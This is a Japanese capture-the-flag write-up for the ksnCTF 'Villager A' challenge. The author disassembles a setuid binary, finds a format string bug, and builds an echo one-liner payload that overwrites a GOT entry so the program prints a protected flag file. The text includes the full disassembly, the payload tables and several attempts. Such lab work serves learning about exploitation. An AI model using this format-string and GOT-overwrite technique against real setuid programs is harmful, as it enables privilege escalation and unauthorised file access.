---
date: 2019-03-13
description: 'ksnctf villagerA'
tags:
 - ctf
---

# ksnCTF Villager A

 - sshで接続してみる
```bash
$ ssh -p 10022 q4@ctfq.sweetduet.info
q4@ctfq.sweetduet.info's password: 
Last login: Wed Mar 13 13:43:28 2019 from 10.0.2.2
[q4@localhost ~]$ ls -l
total 16
-r--------. 1 q4a  q4a    22  5月 22 02:12 2012 flag.txt
-rwsr-xr-x. 1 q4a  q4a  5857  5月 22 11:21 2012 q4
-rw-r--r--. 1 root root  151  6月  1 04:47 2012 readme.txt
```
 - flag.txtというファイルがあるので開きたい

```bash
[q4@localhost ~]$ cat flag.txt 
cat: flag.txt: Permission denied
[q4@localhost ~]$ chmod 755 flag.txt 
chmod: changing permissions of `flag.txt': Operation not permitted
[q4@localhost ~]$ whoami
q4
```

 - `permission denied`らしい
 - 当然`chmod`も使えない
 - 自分の名前は`q4`なので, `q4a`は使えない
 - q4というファイルのパーミッションは`-rwsr-xr-x`なので, `q4a`と異なるグループに属しているユーザでも実行はできそう

```bash
[q4@localhost ~]$ ./q4
What's your name?
q4
Hi, q4

Do you want the flag?
yes
Do you want the flag?
true
Do you want the flag?
yes
Do you want the flag?
no
I see. Good bye.
```

 - noを言うまで問うのをやめてくれない
 - `objdump`で確認する
```bash
$ objdump -d -M intel ./q4
~~ 略 ~~~
080485b4 <main>:
 80485b4:       55                      push   ebp
 80485b5:       89 e5                   mov    ebp,esp
 80485b7:       83 e4 f0                and    esp,0xfffffff0
 80485ba:       81 ec 20 04 00 00       sub    esp,0x420
 80485c0:       c7 04 24 a4 87 04 08    mov    DWORD PTR [esp],0x80487a4
 80485c7:       e8 f8 fe ff ff          call   80484c4 <puts@plt>
 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 80485d1:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80485d5:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
 80485dc:       00 
 80485dd:       8d 44 24 18             lea    eax,[esp+0x18]
 80485e1:       89 04 24                mov    DWORD PTR [esp],eax
 80485e4:       e8 9b fe ff ff          call   8048484 <fgets@plt>
 80485e9:       c7 04 24 b6 87 04 08    mov    DWORD PTR [esp],0x80487b6
 80485f0:       e8 bf fe ff ff          call   80484b4 <printf@plt>
 80485f5:       8d 44 24 18             lea    eax,[esp+0x18]
 80485f9:       89 04 24                mov    DWORD PTR [esp],eax
 80485fc:       e8 b3 fe ff ff          call   80484b4 <printf@plt>
 8048601:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa
 8048608:       e8 67 fe ff ff          call   8048474 <putchar@plt>
 804860d:       c7 84 24 18 04 00 00    mov    DWORD PTR [esp+0x418],0x1
 8048614:       01 00 00 00 
 8048618:       eb 67                   jmp    8048681 <main+0xcd>
 804861a:       c7 04 24 bb 87 04 08    mov    DWORD PTR [esp],0x80487bb
 8048621:       e8 9e fe ff ff          call   80484c4 <puts@plt>
 8048626:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 804862b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804862f:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
 8048636:       00 
 8048637:       8d 44 24 18             lea    eax,[esp+0x18]
 804863b:       89 04 24                mov    DWORD PTR [esp],eax
 804863e:       e8 41 fe ff ff          call   8048484 <fgets@plt>
 8048643:       85 c0                   test   eax,eax
 8048645:       0f 94 c0                sete   al
 8048648:       84 c0                   test   al,al
 804864a:       74 0a                   je     8048656 <main+0xa2>
 804864c:       b8 00 00 00 00          mov    eax,0x0
 8048651:       e9 86 00 00 00          jmp    80486dc <main+0x128>
 8048656:       c7 44 24 04 d1 87 04    mov    DWORD PTR [esp+0x4],0x80487d1
 804865d:       08 
 804865e:       8d 44 24 18             lea    eax,[esp+0x18]
 8048662:       89 04 24                mov    DWORD PTR [esp],eax
 8048665:       e8 7a fe ff ff          call   80484e4 <strcmp@plt>
 804866a:       85 c0                   test   eax,eax
 804866c:       75 13                   jne    8048681 <main+0xcd>
 804866e:       c7 04 24 d5 87 04 08    mov    DWORD PTR [esp],0x80487d5
 8048675:       e8 4a fe ff ff          call   80484c4 <puts@plt>
 804867a:       b8 00 00 00 00          mov    eax,0x0
 804867f:       eb 5b                   jmp    80486dc <main+0x128>
 8048681:       8b 84 24 18 04 00 00    mov    eax,DWORD PTR [esp+0x418]
 8048688:       85 c0                   test   eax,eax
 804868a:       0f 95 c0                setne  al
 804868d:       84 c0                   test   al,al
 804868f:       75 89                   jne    804861a <main+0x66>
 8048691:       c7 44 24 04 e6 87 04    mov    DWORD PTR [esp+0x4],0x80487e6
 8048698:       08 
 8048699:       c7 04 24 e8 87 04 08    mov    DWORD PTR [esp],0x80487e8
 80486a0:       e8 ff fd ff ff          call   80484a4 <fopen@plt>
 80486a5:       89 84 24 1c 04 00 00    mov    DWORD PTR [esp+0x41c],eax
 80486ac:       8b 84 24 1c 04 00 00    mov    eax,DWORD PTR [esp+0x41c]
 80486b3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80486b7:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
 80486be:       00 
 80486bf:       8d 44 24 18             lea    eax,[esp+0x18]
 80486c3:       89 04 24                mov    DWORD PTR [esp],eax
 80486c6:       e8 b9 fd ff ff          call   8048484 <fgets@plt>
 80486cb:       8d 44 24 18             lea    eax,[esp+0x18]
 80486cf:       89 04 24                mov    DWORD PTR [esp],eax
 80486d2:       e8 dd fd ff ff          call   80484b4 <printf@plt>
 80486d7:       b8 00 00 00 00          mov    eax,0x0
 80486dc:       c9                      leave  
 80486dd:       c3                      ret    
 80486de:       90                      nop
 80486df:       90                      nop
~~ 略 ~~~

```
 - 出力より, 次のようにmainが実行されていることがわかる
     - puts
     - fgets
     - printf
     - printf
     - putchar
     - fopen
     - puts
 - fgetsを使用しているのでbofかformat stringを狙える気がする
```bash
[q4@localhost ~]$ ./q4
What's your name?
AAAAAAAAAAAAAAAAAAAAAa
Hi, AAAAAAAAAAAAAAAAAAAAAa

Do you want the flag?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Do you want the flag?
^C
[q4@localhost ~]$ ./q4
What's your name?
AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Hi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
```

 - format stringで行けそう!
 - 引数は6個目
 - 6個目にsystem関数の実行番地を仕込んで実行すれば`/bin/sh`を実行できるか?
 - できなさそう(system関数の番地がわからない)
 - 使えそうな関数を探す
 - 
 ```bash
 [q4@localhost ~]$ objdump -d -M intel -j .plt ./q4 

./q4:     file format elf32-i386


Disassembly of section .plt:

08048454 <__gmon_start__@plt-0x10>:
 8048454:       ff 35 d4 99 04 08       push   DWORD PTR ds:0x80499d4
 804845a:       ff 25 d8 99 04 08       jmp    DWORD PTR ds:0x80499d8
 8048460:       00 00                   add    BYTE PTR [eax],al
 ...

08048464 <__gmon_start__@plt>:
 8048464:       ff 25 dc 99 04 08       jmp    DWORD PTR ds:0x80499dc
 804846a:       68 00 00 00 00          push   0x0
 804846f:       e9 e0 ff ff ff          jmp    8048454 <_init+0x30>

08048474 <putchar@plt>:
 8048474:       ff 25 e0 99 04 08       jmp    DWORD PTR ds:0x80499e0
 804847a:       68 08 00 00 00          push   0x8
 804847f:       e9 d0 ff ff ff          jmp    8048454 <_init+0x30>

08048484 <fgets@plt>:
 8048484:       ff 25 e4 99 04 08       jmp    DWORD PTR ds:0x80499e4
 804848a:       68 10 00 00 00          push   0x10
 804848f:       e9 c0 ff ff ff          jmp    8048454 <_init+0x30>

08048494 <__libc_start_main@plt>:
 8048494:       ff 25 e8 99 04 08       jmp    DWORD PTR ds:0x80499e8
 804849a:       68 18 00 00 00          push   0x18
 804849f:       e9 b0 ff ff ff          jmp    8048454 <_init+0x30>

080484a4 <fopen@plt>:
 80484a4:       ff 25 ec 99 04 08       jmp    DWORD PTR ds:0x80499ec
 80484aa:       68 20 00 00 00          push   0x20
 80484af:       e9 a0 ff ff ff          jmp    8048454 <_init+0x30>

080484b4 <printf@plt>:
 80484b4:       ff 25 f0 99 04 08       jmp    DWORD PTR ds:0x80499f0
 80484ba:       68 28 00 00 00          push   0x28
 80484bf:       e9 90 ff ff ff          jmp    8048454 <_init+0x30>

080484c4 <puts@plt>:
 80484c4:       ff 25 f4 99 04 08       jmp    DWORD PTR ds:0x80499f4
 80484ca:       68 30 00 00 00          push   0x30
 80484cf:       e9 80 ff ff ff          jmp    8048454 <_init+0x30>

080484d4 <__gxx_personality_v0@plt>:
 80484d4:       ff 25 f8 99 04 08       jmp    DWORD PTR ds:0x80499f8
 80484da:       68 38 00 00 00          push   0x38
 80484df:       e9 70 ff ff ff          jmp    8048454 <_init+0x30>

080484e4 <strcmp@plt>:
 80484e4:       ff 25 fc 99 04 08       jmp    DWORD PTR ds:0x80499fc
 80484ea:       68 40 00 00 00          push   0x40
 80484ef:       e9 60 ff ff ff          jmp    8048454 <_init+0x30>
```
 - fopen関数が使えるのでは?
 - 先ほどのmain関数を見返してみると, fopenしてくれている部分がある
 - このfopenをprintfとかputsとかから参照してやれば良さそう?
 - fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる

## 攻撃のまとめ
 - fopen関数の番地は, `0x080484a4`
 - printf関数の番地は, `0x080484b4`
 - printf関数内で呼び出しているのは, `0x080499f0`なので, これを`0x080486a0`に上書きする

|入力アドレス|出力バイト数|総出力バイト数|補足|
|:-:|:-:|:-:|:-:|
|0x080499f0|4|4|4バイトずつ攻撃|
|0x080499f2|4|8|''|
|%39400x|39400|39408|39408(0x99f0)-8=39400|
|%6$n|0|39408|引数は6個目から|
|%28180x|28180|67588|67588(0x0804)-39408=28180|
|%7$n|0|67588|次は7個目|

```bash
echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
```

 - 通らない
 - printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる
```bash
[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
~~ 略 ~~~
Segmentation Fault
~~ 略 ~~~
```

 - gdbで原因を探る
```bash
[q4@localhost ~]$ echo -e 'r\n\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | gdb -q ./q4
Reading symbols from /home/q4/q4...(no debugging symbols found)...done.
(gdb) Hangup detected on fd 0
error detected on stdin
```

 - パイプでバグって正しい結果が出力できていないらしい
     - ref. https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0
 - 引数ではなく, 呼び出す番地が正しくないという仮説をたててみる
 - fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?
 - jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう
 - まとめると次のような感じ

|入力アドレス|出力バイト数|総出力バイト数|補足|
|:-:|:-:|:-:|:-:|
|0x080499f0|4|4|4バイトずつ攻撃|
|0x080499f2|4|8|''|
|%34441x|34441|34449|34449(0x8691)-8=34441|
|%6$n|0|34449|引数は6個目から|
|%33139x|33139|67588|67588(0x10804)-34449=33139|
|%7$n|0|67588|次は7個目|

 - コマンドは次の通り
```bash
$ echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
~~ 略 ~~~
Do you want the flag?
```

 - 通らない...
 - 一応putcharも試す
```bash
$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
~~ 略 ~~~
FLAG_~~~ 略 ~~~
```

 - 通った!!!!!!!

# 感想
 - 通せたのは嬉しい
 - printfは何故に通らなかったの?
 - ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい